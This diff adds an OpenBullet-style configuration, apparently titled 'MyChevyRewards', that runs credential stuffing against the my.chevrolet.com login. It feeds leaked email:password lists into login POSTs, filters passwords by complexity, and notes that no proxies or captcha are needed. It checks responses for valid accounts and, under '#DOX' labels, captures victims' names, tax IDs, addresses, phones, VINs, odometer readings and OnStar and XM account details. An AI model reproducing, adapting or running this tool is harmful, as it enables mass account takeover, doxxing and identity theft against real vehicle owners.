@@ -1,0 +1,90 @@
+[SETTINGS]
+{
+  "Name": "MyChevyRewards",
+  "SuggestedBots": 4,
+  "LastModified": "2018-09-17T03:41:12.7832298+00:00",
+  "AdditionalInfo": "No Proxies Needed, Capture Account info, No Captcha ",
+  "Author": "suffocate",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [
+    {
+      "SliceName": "PASS",
+      "RuleType": 2,
+      "RuleString": "8",
+      "Id": 1380270093
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 0,
+      "RuleString": "Lowercase",
+      "Id": 1920609883
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 0,
+      "RuleString": "Uppercase",
+      "Id": 1515328488
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 0,
+      "RuleString": "Digit",
+      "Id": 2061233868
+    }
+  ],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#Knock_Knock REQUEST GET "https://my.chevrolet.com/oc_login" AutoRedirect=TRUE 
+  CONTENT "j_username=<USER>&j_password=<PASS>&ocevKey=null&temporaryPasswordUsedFlag=null&actc=true" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Android 6.0.1; Mobile; HUAWEI H1611 Build/HuaweiH1611; rv:61.0) Gecko/61.0 Firefox/61.0" 
+  HEADER "Pragma: no-cache" 
+#Hellow REQUEST POST "https://my.chevrolet.com/oc_login" AutoRedirect=TRUE 
+  CONTENT "j_username=<USER>&j_password=<PASS>&ocevKey=null&temporaryPasswordUsedFlag=null&actc=true" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Android 6.0.1; Mobile; HUAWEI H1611 Build/HuaweiH1611; rv:61.0) Gecko/61.0 Firefox/61.0" 
+  HEADER "Pragma: no-cache" 
+#is_Good? KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Invalid Username/Password" 
+  KEYCHAIN Success OR 
+    KEY "loginId" 
+#DOX PARSE "<SOURCE>" JSON "firstName" Recursive=FALSE -> CAP "First Name" "" "" 
+#DOX PARSE "<SOURCE>" JSON "middleName" Recursive=FALSE -> CAP "Middle Name" "" "" 
+#DOX PARSE "<SOURCE>" JSON "lastName" Recursive=FALSE -> CAP "Last Name" "" "" 
+#DOX PARSE "<SOURCE>" JSON "taxId" Recursive=FALSE -> CAP "Tax ID" "" "" 
+#DOX PARSE "<SOURCE>" JSON "address1" Recursive=FALSE -> CAP "Address" "" "" 
+#DOX PARSE "<SOURCE>" JSON "address2" Recursive=FALSE -> CAP "Address continued" "" "" 
+#DOX PARSE "<SOURCE>" JSON "city" Recursive=FALSE -> CAP "City" "" "" 
+#DOX PARSE "<SOURCE>" JSON "stateProvince" Recursive=FALSE -> CAP "State" "" "" 
+#DOX PARSE "<SOURCE>" JSON "postalCode" Recursive=FALSE -> CAP "Zip" "" "" 
+#DOX PARSE "<SOURCE>" JSON "phone1" Recursive=FALSE -> CAP "Phone" "" "" 
+#DOX PARSE "<SOURCE>" JSON "phone1Type" Recursive=FALSE -> CAP "Phone Type" "" "" 
+#DOX PARSE "<SOURCE>" LR "" "" Recursive=FALSE -> VAR "" "" "" 
+#DOX PARSE "<SOURCE>" JSON "onStarAcctId" Recursive=FALSE -> CAP "On-Star Account ID" "" "" 
+#DOX PARSE "<SOURCE>" JSON "profileSyncFromOnStar" Recursive=FALSE -> CAP "Account Synced with Onstar" "" "" 
+#DOX PARSE "<SOURCE>" JSON "vin" Recursive=FALSE -> CAP "VIN" "" "" 
+#DOX PARSE "<SOURCE>" JSON "make" Recursive=FALSE -> CAP "Make" "" "" 
+#DOX PARSE "<SOURCE>" JSON "model" Recursive=FALSE -> CAP "Model" "" "" 
+#DOX PARSE "<SOURCE>" JSON "odometer" Recursive=FALSE -> CAP "Odometer" "" "" 
+#DOX PARSE "<SOURCE>" JSON "odometerLastUpdated" Recursive=FALSE -> CAP "Odometer Last Synced" "" "" 
+#DOX PARSE "<SOURCE>" JSON "xm_radio_id" Recursive=FALSE -> CAP "XM Radio ID" "" "" 
+#DOX PARSE "<SOURCE>" JSON "xm_expiration_date" Recursive=FALSE -> CAP "XM Subscription Good until" "" "" 
+#DOX PARSE "<SOURCE>" JSON "onstarAccountNumber" Recursive=FALSE -> CAP "On-Star Account" "" "" 
+#DOX PARSE "<SOURCE>" JSON "onstarSubscriptionServicesExpirationDate" Recursive=FALSE -> CAP "On-Star Subscrition valid until" "" "" 
